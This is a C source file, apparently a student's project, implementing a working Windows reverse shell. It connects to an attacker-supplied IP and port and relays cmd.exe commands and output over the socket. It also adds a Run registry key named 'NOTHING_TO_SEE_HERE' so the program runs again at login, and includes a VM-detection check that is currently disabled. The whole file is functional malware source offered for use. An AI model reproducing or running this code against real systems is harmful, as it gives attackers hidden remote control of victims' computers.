#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib");

/*
    -Jack Maunsell - Colorado State Universitry

    -reverse shell for Windows in C using Winsock.
    -built in vm detection and persistance
            
*/

/* build with <gcc -o shell shell.c -lws2_32> */

/* check if in vm */
/* dont really need now, i dont know how to escape if in a vm (yet) */
int is_vm() {
    HKEY hKey;
    DWORD dwType = 0;
    DWORD dwSize = 0;
    char buffer[1024];

    /* check the windows reg for vm registry keys*/
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Virtual Machine\\Guest", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "Version", NULL, &dwType, (LPBYTE)buffer, &dwSize);
        RegCloseKey(hKey);
        printf("vm detected\n");
        return 1; /* is a vm */
    }
    printf("no vm, moving on");
    return 0;
}

void persistance() {
    /* get path of executable */
    HKEY hKey;
    char *path = (char *)malloc(MAX_PATH);
    GetModuleFileNameA(NULL, path, MAX_PATH);

    /* try to create a registry key under HKEY_CURRENT_USER so executable runs on boot */
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "NOTHING_TO_SEE_HERE", 0, REG_SZ, (const BYTE *)path, strlen(path) + 1);
        printf("persistance set\n");
        RegCloseKey(hKey);
    }
    else {
        printf("can't establish persistance\n");
    }
    free(path);
}

void remove_persistance() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "NOTHING_TO_SEE_HERE");
        RegCloseKey(hKey);
    } else {
        printf("failed to open registry key for persistence removal.\n");
    }
}

void shell(SOCKET sock) {
    HANDLE hStdOutRead, hStdOutWrite;
    HANDLE hStdInRead, hStdInWrite;

    /* allow pipes to be inherited by children */
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    /* create an in and out pipe */
    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0) || !CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0)) {
        printf("failed to create pipes\n");
        return;
    }
    
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    /* clear si structure and set flags */
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags |= STARTF_USESTDHANDLES;
    si.hStdInput = hStdInRead;
    si.hStdOutput = hStdOutWrite;
    si.hStdError = hStdOutWrite;

    /* run cmd.exe on victim machine (want to try and implement an admin console) */
    char *cmd[] = {"cmd.exe", NULL};

    /* create a new process with correct flags */
    if (!CreateProcess(NULL, cmd[0], NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("failed to create process: %d\n", GetLastError());
        return;
    }

    /* closing pipes for the parent so child can use exclusively */
    CloseHandle(si.hStdInput);
    CloseHandle(si.hStdOutput);
    CloseHandle(si.hStdError);
    CloseHandle(pi.hThread);

    char buffer[4096];
    DWORD bytesRead, bytesWritten;

    while(1) {
        int recvResult = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if(recvResult > 0) {
            buffer[recvResult] = '\0';
            printf("Received command: %s", buffer);

            if (buffer[recvResult - 1] != '\n') {
                strcat(buffer, "\n");
            }

            if (WriteFile(hStdInWrite, buffer, strlen(buffer), &bytesWritten, NULL)) {
                /* dont matter, dont ask */
            }
            else {
                printf("failed to write to shell input: %d\n", GetLastError());
            }
             /* read the output from the shell and send back through socket to attacking machine */
            if (ReadFile(hStdOutRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
                send(sock, buffer, bytesRead, 0);
            }
            else {
                printf("failed to read from shell output: %d\n", GetLastError());
                break;
            }
        }
        else {
            printf("failed to receive command: %d\n", WSAGetLastError());
            break;
        }
    }
    CloseHandle(hStdOutRead);
    CloseHandle(hStdInWrite);
    closesocket(sock);
    printf("sockets closed and shell killed");
}


int main(int argc, char *argv[]) {
    if(argc != 3) {
        printf("use: %s <ATTACKER_IP> <PORT>\n", argv[0]);
        return 1;
    }

    const char *server_ip = argv[1];
    int server_port = atoi(argv[2]);

    // if(is_vm()) {
    //     return 0; /* need to learn how to escape vms */
    // }

    persistance();

    /* set up Winsock */
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    /* initialize Winsock */
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed");
        return 1;
    }
    
    /* create a TCP socket */
    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (sock == INVALID_SOCKET) {
        printf("socket creation failed");
        WSACleanup();
        return 1;
    }

    /* set up sever address structure (convert to network byte order) and server IP */
    server.sin_family = AF_INET;
    server.sin_port = htons(server_port);
    server.sin_addr.s_addr = inet_addr(server_ip);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("connection failed");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("connected at %s:%d\n", server_ip, server_port);
    shell(sock);

    /* clean up, clean up, everybody everywhere, clean up, clean up */
    closesocket(sock);
    WSACleanup();

    return 0;
}